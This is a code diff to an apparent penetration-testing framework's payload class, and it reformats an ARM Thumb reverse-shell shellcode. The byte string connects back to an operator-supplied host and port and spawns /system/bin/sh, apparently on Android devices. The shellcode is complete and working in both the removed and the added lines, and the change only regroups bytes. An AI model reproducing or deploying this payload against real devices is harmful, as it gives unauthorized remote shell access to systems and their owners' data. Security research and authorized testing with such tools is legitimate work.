@@ -83,25 +83,16 @@ class HatSploitPayload(Payload, PayloadGenerator, TCPClient):
 
         self.output_process("Generating shellcode...")
         shellcode = (
-            b"\x01\x10\x8F\xE2"
-            b"\x11\xFF\x2F\xE1"
-            b"\x02\x20\x01\x21"
-            b"\x92\x1A\x0F\x02"
-            b"\x19\x37\x01\xDF"
-            b"\x06\x1C\x08\xA1"
-            b"\x10\x22\x02\x37"
-            b"\x01\xDF\x3F\x27"
-            b"\x02\x21\x30\x1c"
-            b"\x01\xdf\x01\x39"
-            b"\xFB\xD5\x05\xA0"
-            b"\x92\x1a\x05\xb4"
-            b"\x69\x46\x0b\x27"
-            b"\x01\xDF\xC0\x46"
-            b"\x02\x00" + local_port +       # "\x12\x34" struct sockaddr and port
-            local_host +                     # reverse ip address
-            b"\x2f\x73\x79\x73\x74\x65\x6d"  # /system
-            b"\x2f\x62\x69\x6e"              # /bin
-            b"\x2f\x73\x68\x00"              # /sh\0
+            b"\x01\x10\x8f\xe2\x11\xff\x2f\xe1"
+            b"\x02\x20\x01\x21\x92\x1a\x0f\x02"
+	        b"\x19\x37\x01\xdf\x06\x1c\x08\xa1"
+	        b"\x10\x22\x02\x37\x01\xdf\x3f\x27"
+	        b"\x02\x21\x30\x1c\x01\xdf\x01\x39"
+	        b"\xfb\xd5\x05\xa0\x92\x1a\x05\xb4"
+            b"\x69\x46\x0b\x27\x01\xdf\xC0\x46"
+            b"\x02\x00" + local_port + local_host +
+            b"\x2f\x73\x79\x73\x74\x65\x6d\x2f"
+	        b"\x62\x69\x6e\x2f\x73\x68\x00"
         )
 
         self.output_process("Generating payload...")
